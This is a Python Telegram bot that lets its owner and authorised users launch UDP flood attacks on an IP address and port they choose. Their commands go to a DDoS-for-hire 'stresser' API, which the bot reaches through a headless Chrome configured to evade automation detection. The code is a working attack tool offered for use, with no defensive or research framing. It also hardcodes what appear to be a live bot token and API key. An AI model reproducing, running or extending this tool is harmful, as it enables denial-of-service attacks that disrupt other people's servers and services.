import telebot
import time
import threading
import os
import json
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

BOT_TOKEN = "8473566885:AAHO0vs5G7AdDniZhs28501dphSeYOj3Q1E"
API_KEY = "ujiYT1DJIAacgnFB"
OWNER_ID = 7459756974

authorized_users = set()
bot = telebot.TeleBot(BOT_TOKEN)

# Chrome with user data (saved session)
chrome_options = Options()
chrome_options.add_argument('--headless=new')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')
chrome_options.add_argument('--disable-gpu')
chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
chrome_options.add_argument('--disable-blink-features=AutomationControlled')
chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
chrome_options.add_experimental_option('useAutomationExtension', False)

# Create temp dir for Chrome profile
user_data_dir = "/tmp/chrome_profile"
os.makedirs(user_data_dir, exist_ok=True)
chrome_options.add_argument(f"--user-data-dir={user_data_dir}")

driver = None

def init_driver():
    global driver
    if driver is None:
        service = Service()
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    return driver

def get_api_response(ip, port, time_val):
    driver = init_driver()
    url = f"https://susstresser.com/panel/api/api.php?key={API_KEY}&host={ip}&port={port}&time={time_val}&method=udp"
    
    print(f"🌐 Opening: {url}")
    driver.get(url)
    
    # Wait for page load
    time.sleep(15)
    
    # Get page text
    page_text = driver.page_source
    
    # Take screenshot
    screenshot_path = f"screenshot_{int(time.time())}.png"
    driver.save_screenshot(screenshot_path)
    
    return page_text, screenshot_path

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == OWNER_ID:
        bot.reply_to(message, "✅ Bot Active!\n\nCommands:\n/vip <ip> <port> <time>\n/add <user_id>\n/remove <user_id>")
        bot.send_message(message.chat.id, "🌐 First time may take 30 seconds...")
    else:
        bot.reply_to(message, "❌ Unauthorized")

@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id != OWNER_ID:
        return
    try:
        user_id = int(message.text.split()[1])
        authorized_users.add(user_id)
        bot.reply_to(message, f"✅ User {user_id} added!")
    except:
        bot.reply_to(message, "Usage: /add <user_id>")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.from_user.id != OWNER_ID:
        return
    try:
        user_id = int(message.text.split()[1])
        authorized_users.discard(user_id)
        bot.reply_to(message, f"✅ User {user_id} removed!")
    except:
        bot.reply_to(message, "Usage: /remove <user_id>")

@bot.message_handler(commands=['vip'])
def vip_attack(message):
    if message.from_user.id not in authorized_users and message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    try:
        args = message.text.split()
        if len(args) != 4:
            bot.reply_to(message, "⚠️ Usage: /vip <ip> <port> <time>\nExample: /vip 1.1.1.1 80 300")
            return
        
        _, ip, port, time_val = args
        time_val = int(time_val)
        
        if time_val < 60:
            bot.reply_to(message, "❌ Minimum 60 seconds!")
            return
        
        bot.reply_to(message, f"⚡ Attack Started!\n\n🎯 {ip}:{port}\n⏱️ {time_val}s\n\n📸 Sending screenshot to owner...")
        
        def process():
            try:
                response_text, screenshot_path = get_api_response(ip, port, time_val)
                
                # Send screenshot to owner
                with open(screenshot_path, 'rb') as photo:
                    bot.send_photo(OWNER_ID, photo, caption=f"🎯 {ip}:{port} | {time_val}s\n👤 User: {message.from_user.id}")
                os.remove(screenshot_path)
                
                # Send response to user
                if "error" in response_text.lower() or "verify" in response_text.lower():
                    bot.send_message(message.chat.id, f"⚠️ API Response:\n{response_text[:200]}")
                else:
                    bot.send_message(message.chat.id, "✅ Attack command sent to API!")
                    
            except Exception as e:
                bot.send_message(OWNER_ID, f"❌ Error: {str(e)}")
        
        threading.Thread(target=process).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['status'])
def status(message):
    bot.reply_to(message, "🟢 Bot Running!\n✅ Chrome Ready\n✅ Session Saved")

print("🤖 Starting Telegram Bot...")
print(f"✅ Bot Token: {BOT_TOKEN[:10]}...")
print("🔄 Polling started...")

while True:
    try:
        bot.infinity_polling(timeout=60)
    except Exception as e:
        print(f"❌ Polling error: {e}")
        time.sleep(5)
